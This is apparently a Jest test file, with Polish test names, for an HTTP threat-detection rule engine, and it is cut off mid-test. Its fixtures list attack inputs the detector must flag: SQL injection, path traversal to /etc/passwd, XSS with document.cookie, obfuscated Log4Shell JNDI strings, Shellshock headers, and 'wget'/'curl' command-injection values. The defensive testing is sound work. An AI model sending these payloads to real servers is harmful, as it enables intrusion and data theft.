import HttpThreatCategory from '../../src/types/enums/HttpThreatCategory';
import { HttpThreat, HttpThreatInput } from '../../src/types/interfaces/HttpThreatDetectedEvent';
import {
    HttpThreatRequestText,
    HttpThreatRuleContext,
    HttpThreatRules,
} from '../../src/services/ThreatDetection/HttpThreatRules';
import {
    HttpThreatText,
    MAX_HEADER_TEXT_LENGTH,
    MAX_URL_TEXT_LENGTH,
} from '../../src/services/ThreatDetection/HttpThreatText';
import {
    CHROME_USER_AGENT,
    FIREFOX_USER_AGENT,
    HEADLESS_CHROME_USER_AGENT,
    IPHONE_SAFARI_USER_AGENT,
    LEGIT_REQUESTS,
    OPERA_USER_AGENT,
    SQL_INJECTION_SCAN_QUERIES,
} from './fixtures/http-threat-requests';

interface RequestOverrides {
    path?: string;
    query?: string;
    userAgent?: string;
    referer?: string;
    method?: string;
    host?: string;
    origin?: string;
    clientHints?: string;
    fromInternalNetwork?: boolean;
}

interface AttackCase {
    name: string;
    request: RequestOverrides;
    category: HttpThreatCategory;
    rule: string;
    input: HttpThreatInput;
}

const ALLOWED_HOSTS: ReadonlySet<string> = new Set(['example.com', 'www.example.com', 'localhost', '127.0.0.1', '::1']);

const CONTEXT: HttpThreatRuleContext = {
    allowedOrigin: 'https://example.com',
    allowedHosts: ALLOWED_HOSTS,
    disabledCategories: new Set<HttpThreatCategory>(),
};

function buildText(overrides: RequestOverrides = {}): HttpThreatRequestText {
    return {
        path: HttpThreatText.truncate(HttpThreatText.decode(overrides.path ?? '/home', false), MAX_URL_TEXT_LENGTH),
        query: HttpThreatText.truncate(HttpThreatText.decode(overrides.query ?? '', true), MAX_URL_TEXT_LENGTH),
        userAgent: HttpThreatText.truncate(overrides.userAgent ?? '', MAX_HEADER_TEXT_LENGTH),
        referer: HttpThreatText.truncate(overrides.referer ?? '', MAX_HEADER_TEXT_LENGTH),
        method: (overrides.method ?? 'GET').toUpperCase(),
        host: overrides.host ?? 'example.com',
        origin: overrides.origin ?? 'https://example.com',
        clientHints: HttpThreatText.truncate(overrides.clientHints ?? '', MAX_HEADER_TEXT_LENGTH),
        fromInternalNetwork: overrides.fromInternalNetwork ?? false,
    };
}

function buildContext(disabledCategories: HttpThreatCategory[] = []): HttpThreatRuleContext {
    return {
        allowedOrigin: CONTEXT.allowedOrigin,
        allowedHosts: CONTEXT.allowedHosts,
        disabledCategories: new Set<HttpThreatCategory>(disabledCategories),
    };
}

const ATTACK_CASES: AttackCase[] = [
    {
        name: '/wp-login.php',
        request: { path: '/wp-login.php' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-wordpress',
        input: 'path',
    },
    {
        name: '/wp-admin/',
        request: { path: '/wp-admin/' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-wordpress',
        input: 'path',
    },
    {
        name: '/xmlrpc.php',
        request: { path: '/xmlrpc.php' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-script-file',
        input: 'path',
    },
    {
        name: '/phpmyadmin/',
        request: { path: '/phpmyadmin/' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-phpmyadmin',
        input: 'path',
    },
    {
        name: '/cgi-bin/luci',
        request: { path: '/cgi-bin/luci' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-cgi',
        input: 'path',
    },
    {
        name: '/default.aspx',
        request: { path: '/default.aspx' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-script-file',
        input: 'path',
    },
    {
        name: '/actuator/health',
        request: { path: '/actuator/health' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-actuator',
        input: 'path',
    },
    {
        name: '/solr/admin/cores',
        request: { path: '/solr/admin/cores' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-solr',
        input: 'path',
    },
    {
        name: '/vendor/phpunit/phpunit/phpunit',
        request: { path: '/vendor/phpunit/phpunit/phpunit' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-phpunit',
        input: 'path',
    },
    {
        name: '/.env',
        request: { path: '/.env' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-dotenv',
        input: 'path',
    },
    {
        name: '/public_html/.env.dev',
        request: { path: '/public_html/.env.dev' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-dotenv',
        input: 'path',
    },
    {
        name: '/.git/config',
        request: { path: '/.git/config' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-git',
        input: 'path',
    },
    {
        name: '/.svn/entries',
        request: { path: '/.svn/entries' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-vcs',
        input: 'path',
    },
    {
        name: '/.aws/credentials',
        request: { path: '/.aws/credentials' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-cloud',
        input: 'path',
    },
    {
        name: '/backup.sql',
        request: { path: '/backup.sql' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-backup',
        input: 'path',
    },
    {
        name: '/db.bak',
        request: { path: '/db.bak' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-backup',
        input: 'path',
    },
    {
        name: '/.DS_Store',
        request: { path: '/.DS_Store' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-ds-store',
        input: 'path',
    },
    {
        name: '/config.json',
        request: { path: '/config.json' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-config',
        input: 'path',
    },
    {
        name: '?id=1+UNION+SELECT+1',
        request: { query: 'id=1+UNION+SELECT+1' },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-union-select',
        input: 'query',
    },
    {
        name: '/articles/tag/1%27%20UNION%20SELECT%20NULL--',
        request: { path: "/articles/tag/1'%20UNION%20SELECT%20NULL--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-union-select',
        input: 'path',
    },
    {
        name: '?q=1%27+AND+SLEEP(5)--',
        request: { query: "q=1'+AND+SLEEP(5)--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-timing-function',
        input: 'query',
    },
    {
        name: '?q=1%27+AND+BENCHMARK(1000000,MD5(1))--',
        request: { query: "q=1'+AND+BENCHMARK(1000000,MD5(1))--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-timing-function',
        input: 'query',
    },
    {
        name: '?q=1%27+AND+EXTRACTVALUE(1,CONCAT(0x7e,1))--',
        request: { query: "q=1'+AND+EXTRACTVALUE(1,CONCAT(0x7e,1))--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-error-function',
        input: 'query',
    },
    {
        name: '?q=1%27+AND+CONCAT(0x7e,1)--',
        request: { query: "q=1'+AND+CONCAT(0x7e,1)--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-hex-concat',
        input: 'query',
    },
    {
        name: '?q=1%27+ORDER+BY+1--',
        request: { query: "q=1'+ORDER+BY+1--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-order-by-comment',
        input: 'query',
    },
    {
        name: '?q=1%27+OR+%271%27%3D%271',
        request: { query: "q=1'+OR+'1'='1" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-boolean-injection',
        input: 'query',
    },
    {
        name: '?q=1)/**/AND/**/(1=1',
        request: { query: 'q=1)/**/AND/**/(1=1' },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-comment-keyword',
        input: 'query',
    },
    {
        name: '?q=1%3BSELECT+pg_sleep(5)',
        request: { query: 'q=1;SELECT+pg_sleep(5)' },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-stacked-query',
        input: 'query',
    },
    {
        name: '?q=1%3BWAITFOR+DELAY+%270%3A0%3A5%27--',
        request: { query: "q=1;WAITFOR+DELAY+'0:0:5'--" },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-waitfor-delay',
        input: 'query',
    },
    {
        name: '/static/..%2f..%2fetc/passwd',
        request: { path: '/static/..%2f..%2fetc/passwd' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-parent-directory',
        input: 'path',
    },
    {
        name: '?file=../../../../etc/passwd',
        request: { query: 'file=../../../../etc/passwd' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-parent-directory',
        input: 'query',
    },
    {
        name: '?f=..\\..\\win.ini',
        request: { query: 'f=..\\..\\win.ini' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-parent-directory',
        input: 'query',
    },
    {
        name: '?f=/proc/self/environ',
        request: { query: 'f=/proc/self/environ' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-system-file',
        input: 'query',
    },
    {
        name: '?file=win.ini',
        request: { query: 'file=win.ini' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-system-file',
        input: 'query',
    },
    {
        name: '?file=boot.ini',
        request: { query: 'file=boot.ini' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-system-file',
        input: 'query',
    },
    {
        name: '?u=file:///etc/hosts',
        request: { query: 'u=file:///etc/hosts' },
        category: HttpThreatCategory.PathTraversal,
        rule: 'traversal-file-uri',
        input: 'query',
    },
    {
        name: '?q=<script>alert(1)</script>',
        request: { query: 'q=<script>alert(1)</script>' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-script-tag',
        input: 'query',
    },
    {
        name: '?q=<script>alert(1)</script> alert',
        request: { query: 'q=<script>alert(1)</script>' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-alert-call',
        input: 'query',
    },
    {
        name: '?r=javascript:alert(1)',
        request: { query: 'r=javascript:alert(1)' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-javascript-uri',
        input: 'query',
    },
    {
        name: '?q=<img src=x onerror=alert(1)>',
        request: { query: 'q=<img src=x onerror=alert(1)>' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-event-handler',
        input: 'query',
    },
    {
        name: '/%3Csvg/onload=alert(1)%3E',
        request: { path: '/%3Csvg/onload=alert(1)%3E' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-svg-tag',
        input: 'path',
    },
    {
        name: '?q=<script>document.cookie</script>',
        request: { query: 'q=<script>document.cookie</script>' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-document-cookie',
        input: 'query',
    },
    {
        name: 'user-agent ${jndi:ldap://x.example/a}',
        request: { userAgent: '${jndi:ldap://x.example/a}' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-jndi',
        input: 'user-agent',
    },
    {
        name: 'referer ${jndi:ldap://x}',
        request: { referer: '${jndi:ldap://x}' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-jndi',
        input: 'referer',
    },
    {
        name: '?q={{7*7}}',
        request: { query: 'q={{7*7}}' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-template-expression',
        input: 'query',
    },
    {
        name: '?cmd=;wget http://x/a.sh',
        request: { query: 'cmd=;wget http://x/a.sh' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shell-chain',
        input: 'query',
    },
    {
        name: '?x=$(curl x)',
        request: { query: 'x=$(curl x)' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-substitution',
        input: 'query',
    },
    {
        name: '?q=%60id%60',
        request: { query: 'q=%60id%60' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-backtick',
        input: 'query',
    },
    {
        name: '?x=|sh',
        request: { query: 'x=|sh' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-pipe-shell',
        input: 'query',
    },
    {
        name: '?x=/bin/sh',
        request: { query: 'x=/bin/sh' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shell-binary',
        input: 'query',
    },
    {
        name: 'user-agent sqlmap',
        request: { userAgent: 'sqlmap/1.8#stable' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-sqlmap',
        input: 'user-agent',
    },
    {
        name: 'user-agent Nikto',
        request: { userAgent: 'Nikto/2.1.6' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent Nuclei',
        request: { userAgent: 'Nuclei - Open-source project' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent wpscan',
        request: { userAgent: 'WPScan v3.8.25' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent dirbuster',
        request: { userAgent: 'DirBuster-1.0-RC1' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent gobuster',
        request: { userAgent: 'gobuster/3.6' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent ffuf',
        request: { userAgent: 'Fuzz Faster U Fool v2.1.0' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent acunetix',
        request: { userAgent: 'Acunetix-Aspect' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent netsparker',
        request: { userAgent: 'Netsparker/5.0' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent havij',
        request: { userAgent: 'Havij' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent Nmap',
        request: { userAgent: 'Mozilla/5.0 (compatible; Nmap Scripting Engine)' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-network-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent zgrab',
        request: { userAgent: 'zgrab/0.x' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-network-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent masscan',
        request: { userAgent: 'masscan/1.3' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-network-scanner',
        input: 'user-agent',
    },
    {
        name: 'method TRACE',
        request: { method: 'TRACE' },
        category: HttpThreatCategory.MalformedRequest,
        rule: 'malformed-method',
        input: 'method',
    },
    {
        name: 'method PROPFIND',
        request: { method: 'PROPFIND' },
        category: HttpThreatCategory.MalformedRequest,
        rule: 'malformed-method',
        input: 'method',
    },
    {
        name: '/php-cgi/php-cgi.exe',
        request: { path: '/php-cgi/php-cgi.exe' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-php-cgi',
        input: 'path',
    },
    {
        name: '?allow_url_include=1',
        request: { query: 'allow_url_include=1' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-php-include',
        input: 'query',
    },
    {
        name: '?f=php://input',
        request: { query: 'f=php://input' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-php-include',
        input: 'query',
    },
    {
        name: '/server-status',
        request: { path: '/server-status' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/_ignition/execute-solution',
        request: { path: '/_ignition/execute-solution' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/telescope/requests',
        request: { path: '/telescope/requests' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/_profiler/phpinfo',
        request: { path: '/_profiler/phpinfo' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/HNAP1/',
        request: { path: '/HNAP1/' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/boaform/',
        request: { path: '/boaform/' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/GponForm/',
        request: { path: '/GponForm/' },
        category: HttpThreatCategory.ForeignTechnologyProbe,
        rule: 'foreign-server-path',
        input: 'path',
    },
    {
        name: '/.vscode/sftp.json',
        request: { path: '/.vscode/sftp.json' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '/sftp-config.json',
        request: { path: '/sftp-config.json' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '/.htaccess',
        request: { path: '/.htaccess' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '/web.config',
        request: { path: '/web.config' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '/.npmrc',
        request: { path: '/.npmrc' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '/docker-compose.yml',
        request: { path: '/docker-compose.yml' },
        category: HttpThreatCategory.SecretFileProbe,
        rule: 'secret-project-file',
        input: 'path',
    },
    {
        name: '?page=1+AND+4512=4512',
        request: { query: 'page=1 AND 4512=4512' },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-numeric-boolean',
        input: 'query',
    },
    {
        name: '?page=1+OR+1=1--',
        request: { query: 'page=1 OR 1=1--' },
        category: HttpThreatCategory.SqlInjection,
        rule: 'sql-numeric-boolean',
        input: 'query',
    },
    {
        name: '?q=onload=fetch(1)',
        request: { query: 'q=onload=fetch(1)' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-event-handler',
        input: 'query',
    },
    {
        name: '?q=x onerror=y',
        request: { query: 'q=x onerror=y' },
        category: HttpThreatCategory.Xss,
        rule: 'xss-event-handler',
        input: 'query',
    },
    {
        name: 'user-agent ${${lower:j}ndi:ldap://x}',
        request: { userAgent: '${${lower:j}ndi:ldap://x}' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-jndi-obfuscated',
        input: 'user-agent',
    },
    {
        name: '?q=${${::-j}${::-n}${::-d}${::-i}:ldap://x}',
        request: { query: 'q=${${::-j}${::-n}${::-d}${::-i}:ldap://x}' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-jndi-obfuscated',
        input: 'query',
    },
    {
        name: 'user-agent Shellshock',
        request: { userAgent: '() { :; }; echo vulnerable' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shellshock',
        input: 'user-agent',
    },
    {
        name: 'referer Shellshock',
        request: { referer: '() { ignored; }; /bin/sh' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shellshock',
        input: 'referer',
    },
    {
        name: '/shellshock in path',
        request: { path: '/() { :; };' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shellshock',
        input: 'path',
    },
    {
        name: '?q=() { :; };',
        request: { query: 'q=() { :; };' },
        category: HttpThreatCategory.CommandInjection,
        rule: 'command-shellshock',
        input: 'query',
    },
    {
        name: 'user-agent feroxbuster',
        request: { userAgent: 'feroxbuster/2.10.4' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent Wfuzz',
        request: { userAgent: 'Wfuzz/3.1.0' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent l9explore',
        request: { userAgent: 'l9explore/1.0' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'user-agent acunetix_wvs_security_test',
        request: { userAgent: 'acunetix_wvs_security_test' },
        category: HttpThreatCategory.ScannerUserAgent,
        rule: 'scanner-web-scanner',
        input: 'user-agent',
    },
    {
        name: 'origin https://evil.example',
        request: { origin: 'https://evil.example' },
        category: HttpThreatCategory.MalformedRequest,
        rule: 'malformed-origin',
        input: 'origin',
    },
    {
        name: 'host evil.example',
        request: { host: 'evil.example' },
        category: HttpThreatCategory.MalformedRequest,
        rule: 'malformed-host',
        input: 'host',
    },
];

describe('HttpThreatRules', () => {
    describe('skan SQL injection', () => {
        it.each(SQL_INJECTION_SCAN_QUERIES.map((query: string, index: number): { index: number; query: string } => ({ index, query })))(
            'skan query #$index daje SQL injection',
            ({ query }: { index: number; query: string }) => {
                const threats: HttpThreat[] = HttpThreatRules.match(
                    buildText({ path: '/articles/tag/bw', query: query }),
                    CONTEXT,
                );

                expect(threats).toEqual(
                    expect.arrayContaining([
                        { category: HttpThreatCategory.SqlInjection, rule: expect.any(String), input: 'query' },
                    ]),
                );
            },
        );
    });

    describe('korpus legalny', () => {
        it.each(LEGIT_REQUESTS)('$path?$query nie daje trafień', (request: { path: string; query: string; userAgent: string }) => {
            const threats: HttpThreat[] = HttpThreatRules.match(
                buildText({ path: request.path, query: request.query, userAgent: request.userAgent }),
                CONTEXT,
            );

            expect(threats).toEqual([]);
        });
    });

    describe('po jednym trafieniu na regułę', () => {
        it.each(ATTACK_CASES)('$name', (attackCase: AttackCase) => {
            const threats: HttpThreat[] = HttpThreatRules.match(buildText(attackCase.request), CONTEXT);

            expect(threats).toEqual(
                expect.arrayContaining([
                    { category: attackCase.category, rule: attackCase.rule, input: attackCase.input },
                ]),
            );
        });
    });

    describe('hosty z portem', () => {
        it.each([
            ['Example.com:443', 'example.com'],
            ['[::1]:8081', '::1'],
            ['localhost:8081', 'localhost'],
        ])('%s daje %s bez trafienia MalformedRequest', (hostHeader: string, expectedHost: string) => {
            expect(HttpThreatRules.hostWithoutPort(hostHeader)).toBe(expectedHost);

            const threats: HttpThreat[] = HttpThreatRules.match(buildText({ host: expectedHost }), CONTEXT);

            expect(threats.filter((threat: HttpThreat): boolean => threat.category === HttpThreatCategory.MalformedRequest)).toEqual([]);
        });
    });

    describe('adresy wewnętrzne', () => {
        it('Host: _ z sieci wewnętrznej nie daje malformed-host', (): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(
                buildText({host: '_', fromInternalNetwork: true}),
                CONTEXT,
            );

            expect(threats).toEqual([]);
        });

        it('Host: _ spoza sieci wewnętrznej daje malformed-host', (): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(buildText({host: '_'}), CONTEXT);

            expect(threats).toContainEqual({
                category: HttpThreatCategory.MalformedRequest,
                rule: 'malformed-host',
                input: 'host',
            });
        });

        it('metoda TRACE z sieci wewnętrznej nadal daje malformed-method', (): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(
                buildText({method: 'TRACE', fromInternalNetwork: true}),
                CONTEXT,
            );

            expect(threats).toContainEqual({
                category: HttpThreatCategory.MalformedRequest,
                rule: 'malformed-method',
                input: 'method',
            });
        });
    });

    it('pusty user-agent i brak hosta nie dają trafień', () => {
        const threats: HttpThreat[] = HttpThreatRules.match(buildText({ userAgent: '', host: '' }), CONTEXT);

        expect(threats).toEqual([]);
    });

    it('legalne parametry nie przypominają zdarzeń DOM ani komentarzy SQL', () => {
        for (const query of ['only=portraits', 'onlyMine=true&page=2', 'q=portret+online%3Dtak', 'q=color/*red*/']) {
            const threats: HttpThreat[] = HttpThreatRules.match(buildText({ query: query }), CONTEXT);

            expect(threats).toEqual([]);
        }
    });

    it('same cyfry z and/or bez porównania nie są SQL injection', () => {
        const threats: HttpThreat[] = HttpThreatRules.match(buildText({ query: 'page=1 and 2' }), CONTEXT);

        expect(threats).toEqual([]);
    });

    it('metody odrzucane przez parser Node nie są raportowane', () => {
        for (const method of ['TRACK', 'DEBUG']) {
            const threats: HttpThreat[] = HttpThreatRules.match(buildText({ method: method }), CONTEXT);

            expect(threats).toEqual([]);
        }
    });

    it('wyłączona kategoria MalformedRequest wyłącza gałęzie origin i host', () => {
        const threats: HttpThreat[] = HttpThreatRules.match(
            buildText({ origin: 'https://evil.example', host: 'evil.example' }),
            buildContext([HttpThreatCategory.MalformedRequest]),
        );

        expect(threats).toEqual([]);
    });

    it('wyłączona kategoria nie daje trafień', () => {
        const threats: HttpThreat[] = HttpThreatRules.match(
            buildText({ path: '/wp-login.php' }),
            buildContext([HttpThreatCategory.ForeignTechnologyProbe]),
        );

        expect(threats).toEqual([]);
    });

    it('identyfikatory reguł są kebab-case', () => {
        const rules: string[] = ATTACK_CASES.map((attackCase: AttackCase): string => attackCase.rule);

        for (const rule of rules) {
            expect(rule).toMatch(/^[a-z0-9]+(-[a-z0-9]+)*$/);
        }
    });

    describe('podszywanie się pod przeglądarkę', () => {
        const CHROMIUM_CLIENT_HINTS: string = '"Chromium";v="138"';
        const HEADLESS_CLIENT_HINTS: string = '"Chromium";v="138", "HeadlessChrome";v="138"';
        const REGULAR_CHROME_CLIENT_HINTS: string =
            '"Google Chrome";v="138", "Chromium";v="138", "Not)A;Brand";v="99"';
        const EDGE_USER_AGENT: string =
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' +
            'Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0';
        const CRIOS_USER_AGENT: string =
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) ' +
            'CriOS/138.0.7204.23 Mobile/15E148 Safari/604.1';
        const SAMSUNG_USER_AGENT: string =
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) ' +
            'SamsungBrowser/27.0 Chrome/125.0.0.0 Mobile Safari/537.36';
        const SAMSUNG_CLIENT_HINTS: string =
            '"Samsung Internet";v="27.0", "Chromium";v="125", "Not.A/Brand";v="24"';
        const BRAVE_CLIENT_HINTS: string = '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"';
        const EXAMPLE_RENDER_BOT_USER_AGENT: string =
            'Mozilla/5.0 (compatible; ExampleRenderBot/1.0; +https://example.com/bot)';
        const APPLEBOT_USER_AGENT: string =
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) ' +
            'Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)';

        it.each([
            {
                name: 'Chrome i HeadlessChrome w Client Hints',
                request: {userAgent: CHROME_USER_AGENT, clientHints: HEADLESS_CLIENT_HINTS},
                rule: 'spoofing-client-hints-headless',
            },
            {
                name: 'iPhone Safari i Chromium w Client Hints',
                request: {userAgent: IPHONE_SAFARI_USER_AGENT, clientHints: CHROMIUM_CLIENT_HINTS},
                rule: 'spoofing-client-hints-non-chromium',
            },
            {
                name: 'Firefox i Client Hints',
                request: {userAgent: FIREFOX_USER_AGENT, clientHints: CHROMIUM_CLIENT_HINTS},
                rule: 'spoofing-client-hints-non-chromium',
            },
        ])('$name daje $rule', ({request, rule}: {
            name: string;
            request: RequestOverrides;
            rule: string;
        }): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(buildText(request), CONTEXT);

            expect(threats).toEqual(
                expect.arrayContaining([
                    {category: HttpThreatCategory.UserAgentSpoofing, rule: rule, input: 'client-hints'},
                ]),
            );
        });

        it.each([
            ['Chrome z typowymi Client Hints', CHROME_USER_AGENT, REGULAR_CHROME_CLIENT_HINTS],
            ['Edge z typowymi Client Hints', EDGE_USER_AGENT, '"Microsoft Edge";v="129", "Chromium";v="129"'],
            ['Opera z typowymi Client Hints', OPERA_USER_AGENT, '"Opera";v="114", "Chromium";v="128"'],
            ['Samsung Internet z typowymi Client Hints', SAMSUNG_USER_AGENT, SAMSUNG_CLIENT_HINTS],
            ['Brave z typowymi Client Hints', CHROME_USER_AGENT, BRAVE_CLIENT_HINTS],
            ['deklarowany robot z HeadlessChrome w Client Hints', EXAMPLE_RENDER_BOT_USER_AGENT, HEADLESS_CLIENT_HINTS],
            ['Applebot z Client Hints', APPLEBOT_USER_AGENT, HEADLESS_CLIENT_HINTS],
            ['pusty User-Agent z HeadlessChrome w Client Hints', '', HEADLESS_CLIENT_HINTS],
            ['CriOS bez Client Hints', CRIOS_USER_AGENT, ''],
            ['sam HeadlessChrome z Client Hints', HEADLESS_CHROME_USER_AGENT, HEADLESS_CLIENT_HINTS],
        ])('%s nie daje trafień', (_name: string, userAgent: string, clientHints: string): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(
                buildText({userAgent: userAgent, clientHints: clientHints}),
                CONTEXT,
            );

            expect(threats).toEqual([]);
        });

        it('korpus legalny z pustym clientHints dalej jest czysty', (): void => {
            for (const request of LEGIT_REQUESTS) {
                const threats: HttpThreat[] = HttpThreatRules.match(
                    buildText({
                        path: request.path,
                        query: request.query,
                        userAgent: request.userAgent,
                        clientHints: '',
                    }),
                    CONTEXT,
                );

                expect(threats).toEqual([]);
            }
        });

        it('wyłączona kategoria UserAgentSpoofing wyłącza reguły Client Hints', (): void => {
            const threats: HttpThreat[] = HttpThreatRules.match(
                buildText({userAgent: IPHONE_SAFARI_USER_AGENT, clientHints: CHROMIUM_CLIENT_HINTS}),
                buildContext([HttpThreatCategory.UserAgentSpoofing]),
            );

            expect(threats).toEqual([]);
        });
    });

    describe('wejście patologiczne', () => {
        const pathologicalInputs: { name: string; payload: string }[] = [
            { name: "2048 apostrofów", payload: "'".repeat(2048) },
            { name: '2048 liter a', payload: 'a'.repeat(2048) },
            { name: 'naprzemienne /**/AND', payload: '/**/AND'.repeat(292) },
            { name: '2048 znaków procent', payload: '%'.repeat(2048) },
            { name: '2048 znaków mniejszości', payload: '<'.repeat(2048) },
        ];

        it.each(pathologicalInputs)('match kończy się poniżej 50 ms dla $name', ({ payload }: { name: string; payload: string }) => {
